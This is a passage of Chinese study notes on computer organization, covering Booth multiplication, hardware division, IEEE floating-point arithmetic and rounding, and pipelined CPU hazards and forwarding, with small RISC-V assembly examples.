<p>最开始把积放在高位，被乘数放在低位。（数据保存方法同 2.1.1）默认 <span class="arithmatex">\(bit_{-1}=0\)</span></p>
<ul>
<li>
<p>Action</p>
<ul>
<li>10 - subtract multiplicand from left</li>
<li>11 - nop</li>
<li>01 - add multiplicand to left half</li>
<li>00 - nop</li>
</ul>
<p>每个操作结束后都要移位，和 2.1.1 中类似</p>
</li>
</ul>
<div class="admonition key-point">
<p class="admonition-title">Key-point</p>
<p>需要注意的是 Booth算法中，每一次是两位两位看，对于<span class="arithmatex">\(n\)</span>位的，需要进行<span class="arithmatex">\(n\)</span>次操作,但是两位两位看只能看到<span class="arithmatex">\(n-1\)</span>位，因此开始之前是需要在最后一位加上一个 0 再开始做乘法的</p>
</div>
<p>注意移位时不要改变符号位。</p>
<div class="admonition example">
<p class="admonition-title">Example</p>
<p><div align=center> <img src="http://cdn.hobbitqia.cc/202303102233909.png" width = 60%/> </div>   </p>
<p>被乘数 Multiplicand 是 0010,  乘数 Multiplier 是 1101.<br />
最开始将积 0000 放在高四位, 1101 作为乘数放在低四位。
最开始 10, 即执行减操作, <span class="arithmatex">\(0000-0010=1110\)</span>. 答案依然放在高四位，随后右移，以此类推。<br />
注意右移的时候是 <strong>算术右移</strong> ，即符号位不变。</p>
</div>
<h4 id="note-co-wk2-faster-multiplication">Faster Multiplication<a class="headerlink" href="#note-co-wk2-faster-multiplication" title="Permanent link">&para;</a></h4>
<p>32 位数乘 32 位数，相当于 32 个 32 位数相加。（并行加速）</p>
<div align=center> <img src="http://cdn.hobbitqia.cc/202303102249772.png" width = 60%/> </div>

<h3 id="note-co-wk2-division">Division<a class="headerlink" href="#note-co-wk2-division" title="Permanent link">&para;</a></h3>
<div class="arithmatex">\[
Dividend  = quotient \times Divisor + Reminder
\]</div>
<details class="version 1">
<summary>Version</summary>
<ul>
<li>At At first the divisor is in the left half of the divisor register,the dividend is in the right half of the remainder register.</li>
<li>Shift the divisor right each step
<div align=center> <img src="../NOTE/CO/pc/9.png" width = 60%/> </div><br />
即对每一步，都在余数中减去除数，如果结果大于等于0，那么商左移上1，否则将结果加回去，商左移上0。
 <div align=center> <img src="../NOTE/CO/pc/10.png" width = 60%/> </div></li>
</ul>
<p><strong>需要注意的是,由于一开始remainder寄存器右边是被除数，divisor寄存器左半边是除数，前很多次的结果都是负的</strong></p>
</details>
<div class="admonition eg">
<p class="admonition-title">7 / 2</p>
<p><span class="arithmatex">\(00000111 / 0010\)</span>
<div align=center><img src="../NOTE/CO/pc/11.png" width = 60%/> </div>   </p>
</div>
<details class="version final">
<summary>Version</summary>
<p>优化过程与乘法类似，因为每次都是remainder的最高位在减，减完就没用了，可以移出去，不再右移divisor，而是左移remainder，并且将quotient也存在Remainder寄存器每次左移产生的空位中
<div align=center> <img src="../NOTE/CO/pc/12.png" width = 60%/> </div>
如下
<div align=center> <img src="../NOTE/CO/pc/13.png" width = 60%/> </div></p>
</details>
<div class="admonition key-point">
<p class="admonition-title">Key-point</p>
</div>
<p>remainder 寄存器其实要多一位的，因为最后一步要右移，不能直接把它丢掉</p>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p><div align=center> <img src="../NOTE/CO/pc/14.png" width = 60%/> </div>
4.1 时其实我们已经结束了除法操作，此时的高位就是我们的余数，但是这最后一次的结果还没有放回到 Reminder 中，因此我们需要再往左移一位为商留出空间，放入后，再把高位余数往右移动以抵消影响。</p>
</div>
<p>!!!question "为什么除法的移位这么奇怪“
    对于Version1，要进行 <span class="arithmatex">\(n+1\)</span> 次的移位，是为了在最后一步将商补全，同时也抵消最后一步的影响来满足余数的正确性；
    对于Version2，要进行第一次的整体左移是为了得到正确的余数，而在最后一步中，由于商还要进来，余数会多出一位，因此要左半部分右移一位。</p>
<p>对于有符号数的除法，用绝对值来做，然后在结果上加上符号位</p>
<p>sign of quotient = sign of dividend <span class="arithmatex">\(\oplus\)</span> sign of divisor</p>
<p>sign of remainder = sign of dividend</p>
<h2 id="note-co-wk2-floating-point-number">Floating point number<a class="headerlink" href="#note-co-wk2-floating-point-number" title="Permanent link">&para;</a></h2>
<details class="info">
<summary>进制转换</summary>
<p>二进制小数转十进制，如果是科学计数法，可以先仿照十进制的科学计数法用指数进行小数点的移动，然后再转换，这样可以减少计算小数的次数。</p>
<p>十进制转换二进制，可以先转换整数部分，再转换小数部分，小数部分可以依次与<span class="arithmatex">\(2^{-n}\)</span>比较，如果大于等于，那么结果的第 n 位为 1，否则为 0，上了 1 之后，要减去 <span class="arithmatex">\(2^{-n}\)</span>，再继续比较，直到达到精度的要求。</p>
</details>
<table>
<thead>
<tr>
<th style="text-align: left;"></th>
<th>S</th>
<th>exp</th>
<th style="text-align: right;">frac</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align: left;">Float(位数)</td>
<td>1</td>
<td>8</td>
<td style="text-align: right;">23</td>
</tr>
<tr>
<td style="text-align: left;">Double(位数)</td>
<td>1</td>
<td>11</td>
<td style="text-align: right;">52</td>
</tr>
</tbody>
</table>
<p>Normalized form: <span class="arithmatex">\(N=(-1)^S\times M\times 2^E\)</span>  </p>
<ul>
<li>S: sign. <span class="arithmatex">\(S=1\)</span> indicates the number is negative.</li>
<li>M: 尾数. Normally, <span class="arithmatex">\(M=1.frac=1+frac\)</span>.</li>
<li>E: 阶码. Normally, <span class="arithmatex">\(E=exp-Bias\)</span> where <span class="arithmatex">\(Bias=127\)</span> for floating point numbers. <span class="arithmatex">\(Bias = 1023\)</span> for double. </li>
</ul>
<div class="admonition key-point">
<p class="admonition-title">Key-point</p>
<ul>
<li>为什么要把 exponent 放在前面？（因为数的大小主要由 exponent 决定。）</li>
<li>为什么需要 Bias？（移码）可以不保存负数，用的是IEEE标准，即对于8位的移码，<span class="arithmatex">\(Bias=2^{7}-1=127\)</span>，对于11位的移码，<span class="arithmatex">\(Bias=2^{10}-1=1023\)</span>。 </li>
<li>以上是规格化数，尾数前应该有前导 1，就类似于十进制的科学计数法，前导必须大于0小于10.对于2进制，前导必须大于0小于2，也就是1.</li>
</ul>
</div>
<h3 id="note-co-wk2-denormal-numbers">Denormal Numbers<a class="headerlink" href="#note-co-wk2-denormal-numbers" title="Permanent link">&para;</a></h3>
<ul>
<li><span class="arithmatex">\(Exponent=000\ldots 0\)</span> <br />
非规格化数，让数在较小时能逐渐下溢出，在Exponent的部分以全零作为保留字，但是并不代表指数是0，而是说此时的小数不是1.xxxx而是0.xxxx。  <br />
<span class="arithmatex">\(x=(-1)^s\times((0+Fraction)\times 2^{1-Bias})\)</span><br />
<strong>注意此时指数是 <span class="arithmatex">\(1-Bias=-126/-1022\)</span></strong>.   </li>
</ul>
<div align=center> <img src="../NOTE/CO/pc/15.png" width = 80%/> </div>

<h3 id="note-co-wk2-precision">Precision<a class="headerlink" href="#note-co-wk2-precision" title="Permanent link">&para;</a></h3>
<ul>
<li>signle: approx <span class="arithmatex">\(2^{-23}\)</span> <br />
<span class="arithmatex">\(23\times \log_{10}{2} \approx 23\times 0.3 \approx 7\)</span> demical digits of precision.  </li>
<li>double: approx <span class="arithmatex">\(2^{-52}\)</span><br />
<span class="arithmatex">\(52\times \log_{10}{2}\approx 52\times 0.3 \approx 16\)</span> demical digits of preicsion.</li>
</ul>
<h3 id="note-co-wk2-limitations">Limitations<a class="headerlink" href="#note-co-wk2-limitations" title="Permanent link">&para;</a></h3>
<ul>
<li>Overflow: The number is too big to be represented</li>
<li>Underflow: The number is too small to be represented</li>
</ul>
<h3 id="note-co-wk2-floating-point-addition">Floating-Point Addition<a class="headerlink" href="#note-co-wk2-floating-point-addition" title="Permanent link">&para;</a></h3>
<ul>
<li>
<p>Alignment<br />
统一指数，一般小的往大的变。因为系统精度位数有限，如果将大的往小的变，那可能会因此损失较大。  </p>
<details class="example">
<summary>Example</summary>
<p><div align=center> <img src="http://cdn.hobbitqia.cc/202303102351526.png" width = 70%/> </div> </p>
</details>
</li>
<li>
<p>The proper digits have to be added  </p>
</li>
<li>Addition of significands</li>
<li>Normalization of the result</li>
<li>Rounding</li>
</ul>
<details class="example">
<summary>Example</summary>
<p><div align=center> <img src="http://cdn.hobbitqia.cc/202303150835508.png" width = 70%/> </div></p>
</details>
<p><strong>FP Adder Hardware</strong>  </p>
<div align=center> <img src="http://cdn.hobbitqia.cc/202303102359833.png" width = 60%/> </div>

<ul>
<li>step 1 在选择指数大的，并进行对齐。同时尾数可能还要加上前导 1. </li>
<li>step 3 是对结果进行标准化。</li>
<li>蓝色线为控制通路，黑色线为数据通路。</li>
</ul>
<h2 id="note-co-wk2-floating-point-multiplication">Floating-Point Multiplication<a class="headerlink" href="#note-co-wk2-floating-point-multiplication" title="Permanent link">&para;</a></h2>
<p><span class="arithmatex">\((s1\cdot 2^{e1}) \cdot (s2\cdot 2^{s2}) = (s1\cdot s2)\cdot 2^{e1+e2}\)</span></p>
<ul>
<li>Add exponents</li>
<li>Multiply the significands</li>
<li>Normalize</li>
<li>Over/Underflow?<br />
有的话要抛出异常，通过结果的指数判断。</li>
<li>Rounding</li>
<li>Sign</li>
</ul>
<div class="admonition note">
<p class="admonition-title">注意</p>
<p>Exponet 中是有 Bias 的，两个数的 exp 部分相加后还要再减去 Bias. </p>
</div>
<details class="example">
<summary>Example</summary>
<p><div align=center> <img src="http://cdn.hobbitqia.cc/202303150843378.png" width = 60%/> </div></p>
</details>
<p><strong>Data Flow</strong></p>
<div align=center> <img src="http://cdn.hobbitqia.cc/202303150844961.png" width = 60%/> </div>

<ul>
<li>右边往回的箭头: Rounding 后可能会进位。</li>
<li>Incr 用于标准化结果，与右侧 Shift Right 配合。</li>
</ul>
<h2 id="note-co-wk2-accurate-arithmetic">Accurate Arithmetic<a class="headerlink" href="#note-co-wk2-accurate-arithmetic" title="Permanent link">&para;</a></h2>
<ul>
<li>Extra bits of precision (guard, round, sticky)<ul>
<li>guard, round<br />
为了保证四舍五入的精度。<br />
结果没有，只在运算的过程中保留</li>
<li>sticky<br />
末尾如果不为全 0, 则 sticky 位为 1, 否则为 0.</li>
</ul>
</li>
</ul>
<div class="admonition example">
<p class="admonition-title">Example</p>
<p>Guard, round, sticky 位的作用
保留位和舍入位的作用可以提高精度，例如十进制中如果加上舍入位，那么在51和99之间的会向上舍入，而在50和00之间的会向下舍入，这样可以减少误差。
例如2.34+0.0256=2.3656,舍入为2.37，而2.34+0.02=2.36，舍入为2.36，存在1ulp的误差；
在有些情况下，结果左移之后将保护位变成了最低位，只剩下舍入位一位来进行舍入，这样会导致误差增大，而加上sticky位，可以保证在舍入位后面的位数不为0时，舍入位不会被舍去，从而提高精度。例如如果是2.34+0.0050001，如果没有sticky位，那么结果是2.3450，舍入到最近的偶数2.34，而有了sticky位，知道结果是比2.3450大，舍入到最近的偶数2.35。</p>
<p>在二进制中，就是1进0舍，例如小数点后第三位为最低位的1.100_10+0.000_00_11111=1.100_10，此时Guard位为1，Round位为0，Sticky位为1,如果没有sticky位，那么结果就是舍入到最近的偶数1.100，而有了sticky位，知道结果是比1.100_10大，舍入到1.101。</p>
</div>
<div class="admonition key-point">
<p class="admonition-title">Key-point</p>
<p>总的来说，G位如果等于进制的一半，则看它的下一位R位，如果R位大于0了，那么进位，如果为0，那么看S位，如果S位大于0，那么进位。如果RS位都是0了，那么选择最近的偶数来进位。(LSB是奇数，进位；LSB是偶数，舍去屁股后面的)</p>
</div>
<p>损失不会超过 0.5 个 ulp. </p></section><section class="print-page" id="note-co-wk4" heading-number="2.2.2.5"><h1 id="note-co-wk4-_1">处理器<a class="headerlink" href="#note-co-wk4-_1" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 2603 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M392.8 1.2c-17-4.9-34.7 5-39.6 22l-128 448c-4.9 17 5 34.7 22 39.6s34.7-5 39.6-22l128-448c4.9-17-5-34.7-22-39.6m80.6 120.1c-12.5 12.5-12.5 32.8 0 45.3l89.3 89.4-89.4 89.4c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0l112-112c12.5-12.5 12.5-32.8 0-45.3l-112-112c-12.5-12.5-32.8-12.5-45.3 0zm-306.7 0c-12.5-12.5-32.8-12.5-45.3 0l-112 112c-12.5 12.5-12.5 32.8 0 45.3l112 112c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L77.3 256l89.4-89.4c12.5-12.5 12.5-32.8 0-45.3"/></svg></span> 8 行代码 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 17H7V3h14m0-2H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V3a2 2 0 0 0-2-2M3 5H1v16a2 2 0 0 0 2 2h16v-2H3m12.96-10.71-2.75 3.54-1.96-2.36L8.5 15h11z"/></svg></span> 12 张图片 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间 9 分钟</p>
</div>
<p>这一章节主要讨论了单周期和流水线CPU的原理和设计,在实验课上,我们也会使用Verilog来实现这两种CPU.</p>
<p>而CPU的工作流程可以分为以下几个步骤:</p>
<ol>
<li><strong>取指令 (Instruction Fetch)</strong>，IF: 从内存中取出当前指令，并将其存储在指令寄存器中。</li>
<li><strong>指令译码 (Instruction Decode)</strong>，ID: 解析指令，确定操作码和操作数，并读取必要的寄存器值。</li>
<li><strong>执行 (Execution)</strong>，EX: 根据指令类型执行相应的操作，例如算术运算、逻辑运算或内存访问。</li>
<li><strong>访存 (Memory Access)</strong>，MEM: 如果指令需要访问内存（例如加载或存储指令），则进行相应的内存读写操作。</li>
<li><strong>写回 (Write Back)</strong>，WB: 将执行结果写回到目标寄存器中，以便后续指令使用。</li>
</ol>
<p>这些步骤在单周期CPU中是顺序执行的,且在同一个时钟周期内完成,而在流水线CPU中则是并行执行的,同一个时钟周期内可以完成多个步骤,以提高处理器的效率。</p>
<h2 id="note-co-wk4-cpu">单周期CPU<a class="headerlink" href="#note-co-wk4-cpu" title="Permanent link">&para;</a></h2>
<p>SCPU的理论实际上做过一遍实验就很清楚了,考察的点也只是对于Datapath的理解还有不同指令对应的control signal的设置.</p>
<p>在这里贴上笔者这一部分的实验报告</p>
<div class="card file-block">
<div class="file-icon"><img src="../NOTE/CO/pc/pdf.svg" style="height: 3em;"></div>
<div class="file-body">
<div class="file-title">SCPU</div>
<div class="file-meta"></div>
</div>
<p><a class="down-button" target="_blank" href="../NOTE/CO/pc/SCPU.pdf"  markdown="1"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M288 32c0-17.7-14.3-32-32-32s-32 14.3-32 32v242.7l-73.4-73.4c-12.5-12.5-32.8-12.5-45.3 0s-12.5 32.8 0 45.3l128 128c12.5 12.5 32.8 12.5 45.3 0l128-128c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0L288 274.7zM64 352c-35.3 0-64 28.7-64 64v32c0 35.3 28.7 64 64 64h384c35.3 0 64-28.7 64-64v-32c0-35.3-28.7-64-64-64H346.5l-45.3 45.3c-25 25-65.5 25-90.5 0L165.5 352zm368 56a24 24 0 1 1 0 48 24 24 0 1 1 0-48"/></svg></span> 查看</a></p>
</div>
<div class="card file-block">
<div class="file-icon"><img src="../NOTE/CO/pc/pdf.svg" style="height: 3em;"></div>
<div class="file-body">
<div class="file-title">带中断的SCPU</div>
<div class="file-meta"></div>
</div>
<p><a class="down-button" target="_blank" href="../NOTE/CO/pc/interrupt.pdf"  markdown="1"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M288 32c0-17.7-14.3-32-32-32s-32 14.3-32 32v242.7l-73.4-73.4c-12.5-12.5-32.8-12.5-45.3 0s-12.5 32.8 0 45.3l128 128c12.5 12.5 32.8 12.5 45.3 0l128-128c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0L288 274.7zM64 352c-35.3 0-64 28.7-64 64v32c0 35.3 28.7 64 64 64h384c35.3 0 64-28.7 64-64v-32c0-35.3-28.7-64-64-64H346.5l-45.3 45.3c-25 25-65.5 25-90.5 0L165.5 352zm368 56a24 24 0 1 1 0 48 24 24 0 1 1 0-48"/></svg></span> 查看</a></p>
</div>
<p>中断/异常实际上就是说在执行指令的过程中，如果发生了中断/异常，那么就跳转到中断处理程序，执行完中断处理程序之后再跳转回来继续执行指令。</p>
<p>更详细的各种寄存器可以参考</p>
<p><a href="https://note.tonycrane.cc/cs/pl/riscv/privileged/"><strong>TonyCrane的RISC-V笔记</strong></a></p>
<h2 id="note-co-wk4-cpu_1">流水线CPU<a class="headerlink" href="#note-co-wk4-cpu_1" title="Permanent link">&para;</a></h2>
<p>与单周期相比,流水线的理论部分由于Harzard的存在,就变得比较困难了;</p>
<p>笔者在实验课上实现的是一个5级流水线的CPU,使用Forwarding来解决数据冒险,使用将BJ-type的指令提前到ID阶段来解决控制冒险.</p>
<p>贴上实验报告</p>
<div class="card file-block">
<div class="file-icon"><img src="../NOTE/CO/pc/pdf.svg" style="height: 3em;"></div>
<div class="file-body">
<div class="file-title">流水线CPU</div>
<div class="file-meta"></div>
</div>
<p><a class="down-button" target="_blank" href="../NOTE/CO/pc/pipeline.pdf"  markdown="1"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M288 32c0-17.7-14.3-32-32-32s-32 14.3-32 32v242.7l-73.4-73.4c-12.5-12.5-32.8-12.5-45.3 0s-12.5 32.8 0 45.3l128 128c12.5 12.5 32.8 12.5 45.3 0l128-128c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0L288 274.7zM64 352c-35.3 0-64 28.7-64 64v32c0 35.3 28.7 64 64 64h384c35.3 0 64-28.7 64-64v-32c0-35.3-28.7-64-64-64H346.5l-45.3 45.3c-25 25-65.5 25-90.5 0L165.5 352zm368 56a24 24 0 1 1 0 48 24 24 0 1 1 0-48"/></svg></span> 查看</a></p>
</div>
<h3 id="note-co-wk4-_2">引入<a class="headerlink" href="#note-co-wk4-_2" title="Permanent link">&para;</a></h3>
<p>教材上对于流水线CPU的引入采用了洗衣服的比喻</p>
<figure>
<img alt="alt text" src="../NOTE/CO/pc/pip1.png" width="500" />

<figcaption>示意图</figcaption>
</figure>
<p>如图所示,将洗衣服这一过程分成了互不相干的四个步骤：</p>
<ul>
<li>取衣服</li>
<li>用洗衣机洗</li>
<li>叠衣服</li>
<li>放好</li>
</ul>
<p>如果按顺序做,洗三次需要3*4=12个时间单位,而如果流水线化,则只需要4+3=7个时间单位.</p>
<p>加速比为</p>
<div class="arithmatex">\[
\text{Speedup} = \frac{12}{7} \approx 1.71
\]</div>
<p>运用这一思想,我们也可以将CPU互不影响的的五个阶段分别执行,以提高CPU的效率;</p>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>上面的例子也给了我们加速比的计算方法,对于<span class="arithmatex">\(k\)</span>级流水线,如果有<span class="arithmatex">\(m\)</span>条指令,那么加速比为</p>
<div class="arithmatex">\[
\text{Speedup} = \frac{m \times k}{m + k - 1}
\]</div>
<p>当<span class="arithmatex">\(m\)</span>趋近于无穷大时,加速比趋近于<span class="arithmatex">\(k\)</span>.</p>
</div>
<p>理想情况下,当指令充满流水线时,每一个时钟周期都可以完成一条指令,即CPI=1.</p>
<figure>
<img alt="alt text" src="../NOTE/CO/pc/pip2.png" width="500" />

<figcaption>示意图</figcaption>
</figure>
<div class="admonition info inline">
<p class="admonition-title">Info</p>
<p>对于上面的示意图,横向看,对于每一条指令,每一个阶段在不同的时钟周期完成,纵向看,对于每一个时钟周期(当指令充满流水线时)都有五条指令的不同阶段在执行.</p>
</div>
<p><strong>流水线可以提高CPU的吞吐量(throughput),但是并没有改变每一条指令的执行时间Latency</strong></p>
<p>在SCPU中,一个时钟周期的长度取决于用时最长的 <strong>指令</strong> 所需的时间(五个阶段加起来).</p>
<p>在流水线CPU中,一个时钟周期的长度取决于用时最长的 <strong>阶段</strong> 所需的时间.</p>
<h3 id="note-co-wk4-datapath">Datapath<a class="headerlink" href="#note-co-wk4-datapath" title="Permanent link">&para;</a></h3>
<p>与单周期CPU不同,流水线CPU的datapath当然不能直接照搬过来,由于每个时钟周期都有不同的指令的不同阶段在执行,所以中间需要插入四个寄存器将五个阶段的信号隔开来;</p>
<figure>
<img alt="alt text" src="../NOTE/CO/pc/pip3.png" width="500" />

<figcaption>datapath示意图</figcaption>
</figure>
<p>同时也附上笔者画的Datapath:</p>
<figure>
<img alt="alt text" src="../NOTE/CO/pc/pip4.png" width="700" />

<figcaption>Datapath示意图</figcaption>
</figure>
<p>由于在前面阶段的信号在后面也有可能要用到,所以需要考虑哪些信号需要跟着流水级一起前进,
同时从datapath也可以看到一条指令每一个阶段用到的东西都是不一样的(对于寄存器堆虽然读和写用的是同一个regfile,但是在不同的时间段用到,所以也是不一样的)</p>
<div class="admonition advice">
<p class="admonition-title">Advice</p>
<p>如果想要完全掌握CPU的工作流程,一定要自己画一遍Datapath！一定要
自己画一遍Datapath！一定要自己画一遍Datapath！</p>
</div>
<p>至此来看,流水线CPU的设计似乎已经完美了,然而现实很骨感,仍有三座大山阻碍着我们的前进</p>
<ul>
<li>结构冒险</li>
<li>数据冒险</li>
<li>控制冒险</li>
</ul>
<h3 id="note-co-wk4-structure-hazard">Structure Hazard<a class="headerlink" href="#note-co-wk4-structure-hazard" title="Permanent link">&para;</a></h3>
<p>Structure Hazard是由于硬件资源的冲突导致的,比如在一个时钟周期内,两个指令同时要访问同一个硬件资源,这就会导致Structure Hazard(结构冒险).</p>
<p>可能同时被两条指令访问的结构有</p>
<ul>
<li>
<p>寄存器堆:这个不用担心,因为我们实现的寄存器堆同时具有读口和写口,所以不会有冲突</p>
</li>
<li>
<p>内存:如果我们只有一个内存,那么在同一个时钟周期内,两个指令同时要访问内存(取指令和数据访存),解决的方法也很简单,只要把数据内存和指令内存分开就行了</p>
</li>
</ul>
<figure> 
<img alt="alt text" src="../NOTE/CO/pc/pip5.png" width="500" />

<figcaption>S Hazard</figcaption>
</figure>
<p>然而,有的时候为了减小成本或者提高性能,有可能会允许机器出现结构冒险;</p>
<h3 id="note-co-wk4-data-hazard">Data Hazard<a class="headerlink" href="#note-co-wk4-data-hazard" title="Permanent link">&para;</a></h3>
<p>Data Hazard是由于数据相关导致的,即某条指令的执行依赖于前面指令的完成;</p>
<p>例如下面的指令</p>
<p><div class="language-ASM highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#note-co-wk4-__codelineno-0-1"></a><span class="nf">add</span><span class="w"> </span><span class="nv">x1</span><span class="p">,</span><span class="w"> </span><span class="nv">x2</span><span class="p">,</span><span class="w"> </span><span class="nv">x3</span>
</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#note-co-wk4-__codelineno-0-2"></a><span class="nf">add</span><span class="w"> </span><span class="nv">x4</span><span class="p">,</span><span class="w"> </span><span class="nv">x1</span><span class="p">,</span><span class="w"> </span><span class="nv">x5</span>
</span></code></pre></div>
当第二条指令执行到EX阶段时,第一条指令在MEM阶段,还没有写回;</p>
<div class="admonition question">
<p class="admonition-title">隔多少条指令才不会有data hazard</p>
<ul>
<li>相邻的指令,肯定有,无需多言</li>
<li>
<p>隔一条指令,当后执行的指令在ID阶段时,前面的指令在MEM阶段,也会有</p>
</li>
<li>
<p>隔两条指令,当后执行的指令在ID阶段时,前面的指令在WB阶段,此时分为两种情况</p>
<ul>
<li>
<p>如果实现了double pump,即阶段寄存器在时钟上升沿写,寄存器堆在时钟下降沿写,即写回阶段在前半个时钟周期完成写入,由于ID阶段是一直读的,所以后半个时钟周期读到了正确的数据,在下一个时钟周期上升沿到来之前可以把数据传递给EX阶段,所以不会有data hazard</p>
</li>
<li>
<p>如果没有实现double pump,那么在下一个时钟周期上升沿到来之前,数据还没有写入,所以会有data hazard</p>
</li>
</ul>
</li>
</ul>
</div>
<h4 id="note-co-wk4-stall">stall<a class="headerlink" href="#note-co-wk4-stall" title="Permanent link">&para;</a></h4>
<p>解决data hazard的方法有两种,第一种是直接等待(stall),即在ID阶段检测到data hazard之后,停止流水线,等待数据写回,这样会导致流水线效率的降低;</p>
<p>对于实现了double pump的CPU,只用停两个时钟周期,对于没有实现double pump的CPU,则需要停三个时钟周期.</p>
<figure>
<img alt="alt text" src="../NOTE/CO/pc/pip6.png" width="500" />

<figcaption>stall</figcaption>
</figure>
<p>这就好比在流水线中插入了气泡</p>
<p>stall的检测在ID阶段,stall做的事就是IF/ID阶段不变,PC也不变,ID/EX阶段的控制信号设置为0,这样就可以停止流水线了.</p>
<h4 id="note-co-wk4-forwarding">Forwarding<a class="headerlink" href="#note-co-wk4-forwarding" title="Permanent link">&para;</a></h4>
<p>第二种方法是Forwarding,即前递,这个名字很形象,就是把数据提前传递给需要的地方;</p>
<figure>
<img alt="alt text" src="../NOTE/CO/pc/pip7.png" width="400" />

<figcaption>Forwarding</figcaption>
</figure>
<p>在上一条指令的EX阶段结束后,就可以在该指令的MEM阶段把数据往前传递给下一条指令的EX阶段来使用.</p>
<p>判断的条件为MEM阶段或者WB阶段的目的寄存器是否需要改变ID阶段的源寄存器,如果是,则需要进行Forwarding.</p>
<ul>
<li><code>EX/MEM.write &amp;&amp; ID/EX.rs1 == EX/MEM.rd</code></li>
<li><code>EX/MEM.write &amp;&amp; ID/EX.rs2 == EX/MEM.rd</code></li>
<li><code>MEM/WB.write &amp;&amp; ID/EX.rs1 == MEM/WB.rd</code></li>
<li><code>MEM/WB.write &amp;&amp; ID/EX.rs2 == MEM/WB.rd</code></li>
</ul>
<p>其中<code>EX/MEM.write=EX/MEM.regWrite &amp;&amp; EX/MEM.rd!=0</code>, <code>MEM/WB.write=MEM/WB.regWrite &amp;&amp; MEM/WB.rd!=0</code></p>
<p>所以,需要在EX阶段的ALU加入判断是否前递的旁路输入线路</p>
<figure>
<img alt="alt text" src="../NOTE/CO/pc/pip8.png" width="500" />

<figcaption>Forwarding Unit</figcaption>
</figure>
<p>还没结束,当我们连续对同一个寄存器进行改变</p>
<p><div class="language-ASM highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#note-co-wk4-__codelineno-1-1"></a><span class="nf">add</span><span class="w"> </span><span class="nv">x1</span><span class="w"> </span><span class="nv">x1</span><span class="w"> </span><span class="mi">1</span>
</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#note-co-wk4-__codelineno-1-2"></a><span class="nf">add</span><span class="w"> </span><span class="nv">x1</span><span class="w"> </span><span class="nv">x1</span><span class="w"> </span><span class="mi">1</span>
</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#note-co-wk4-__codelineno-1-3"></a><span class="nf">add</span><span class="w"> </span><span class="nv">x1</span><span class="w"> </span><span class="nv">x1</span><span class="w"> </span><span class="mi">1</span>
</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#note-co-wk4-__codelineno-1-4"></a><span class="nf">add</span><span class="w"> </span><span class="nv">x1</span><span class="w"> </span><span class="nv">x1</span><span class="w"> </span><span class="mi">1</span>
</span></code></pre></div>
这时候明显两种条件都满足,所以需要为它们加上优先级,实际上也不难发现,我们应该优先检测EX/MEM阶段的前递,因为它的数据是最新的,只有当它不满足，我们才检测MEM/WB阶段的前递.</p>
<p>还有最后一种需要考虑的情况</p>
<div class="language-ASM highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#note-co-wk4-__codelineno-2-1"></a><span class="nf">ld</span><span class="w"> </span><span class="nv">x1</span><span class="w"> </span><span class="mi">0</span><span class="p">(</span><span class="nv">x2</span><span class="p">)</span>
